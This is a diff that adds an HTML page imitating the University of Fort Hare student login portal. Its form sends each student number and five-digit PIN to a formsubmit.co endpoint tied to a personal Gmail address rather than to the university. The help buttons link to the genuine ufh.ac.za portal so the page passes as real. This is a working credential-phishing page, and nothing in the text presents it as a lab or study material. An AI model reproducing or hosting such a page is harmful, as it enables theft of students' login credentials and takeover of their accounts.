@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>UFH Login</title>
+
+  <!-- Roboto font -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      text-align: center;
+      background: whitesmoke;
+      font-family: 'Roboto', sans-serif;
+    }
+    fieldset {
+      background: white;
+      border: none;
+      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+      margin: 5px auto;
+      width: 96vw;
+      padding: 10px;
+      box-sizing: border-box;
+      position: relative;
+      right: 0.1vw;
+      
+          }
+    .input, .h52 {
+      border: 1px solid lightgrey;
+      border-bottom: solid lightgrey 2px;
+      width: 89vw;
+      height: 9vw;
+      margin-bottom: 10px;
+      font-size: 1rem;
+      padding: 4px;
+      box-sizing: border-box;
+    }
+    .h5 {
+      position: relative;
+      right: 40vw;
+      font-weight: bolder;
+      margin-top: 12px;
+    }
+    
+    .p {
+      position: relative;
+      right: 30vw;
+      font-weight: bolder;
+      margin-top: 12px;
+    }
+    button {
+      background: none;
+      border: 1px solid lightgrey;
+      height: 8vw;
+      margin: 2px;
+      font-family: 'Roboto', sans-serif;
+      cursor: pointer;
+      font-size: 0.95rem;
+    }
+    header {
+      color: white;
+      height: 6vw;
+      text-align: center;
+      font-size: 4vw;
+      background: dodgerblue;
+      line-height: 7vw;
+    }
+    .header {
+      background: lightgrey;
+      color: grey;
+      font-size: 15px;
+      font-weight: bold;
+      border-bottom: solid black 1px;
+      top: 2vw;
+      padding: 8px 0;
+    }
+
+    /* Container for login + first two buttons inline */
+    .button-line {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 10px;
+    }
+
+    /* Second line buttons */
+    .button-line-second {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 4px;
+    }
+  </style>
+</head>
+<body>
+  <header class="header">UNIVERSITY OF FORTHARE - PRODUCTION</header>
+
+  <form action="https://formsubmit.co/aimgod2008g@gmail.com" method="POST">
+    <!-- redirect after submit -->
+    <input type="hidden" name="_next" value="http://localhost:8080/ufh2.html">
+
+    <header>Registered Users: Login Credentials</header>
+    <fieldset>
+      <label><input type="radio" name="radio" value="Student"> Student</label>
+      <label><input type="radio" name="radio" value="Personal"> Personal</label>
+      <label><input type="radio" name="radio" value="Other"> Other</label>
+
+      <br><br>
+      <label class="p">Student Number :</label>
+      <input class="h52" type="number" name="student_number"
+             oninput="if(this.value.length > 9) this.value = this.value.slice(0, 9)"
+             required pattern="\d{9}" title="Please enter exactly 9 digits">
+
+      <label class="h5">Pin :</label>
+      <input class="input" type="number" name="pin"
+             oninput="if(this.value.length > 5) this.value = this.value.slice(0, 5)" required>
+
+      <p>(5 numeric digits. Do not start with a 0.)</p>
+
+      <!-- First line: Login + first two buttons -->
+      <div class="button-line">
+                  <button type="submit">Login</button>
+                  
+  <button type="button" onclick="window.location.href='https://ienabler.ufh.ac.za/pls/prodi41/w99pkg.mi_validate_user'">Forgot Pin</button>
+<button type="button" onclick="window.location.href='https://ienabler.ufh.ac.za/pls/prodi41/w99pkg.mi_validate_user'">Change Pin</button>
+
+   </div>
+
+      <!-- Second line: remaining two buttons -->
+      <div class="button-line-second">
+<button type="button" onclick="window.location.href='https://ienabler.ufh.ac.za/pls/prodi41/w99pkg.mi_validate_user'">Forgot A Pin</button>
+<button type="button" onclick="window.location.href='https://ienabler.ufh.ac.za/pls/prodi41/w99pkg.mi_validate_user'">Forgot Student Number</button>
+      </div>
+    </fieldset>
+  </form>
+</body>
+  </html>
+  
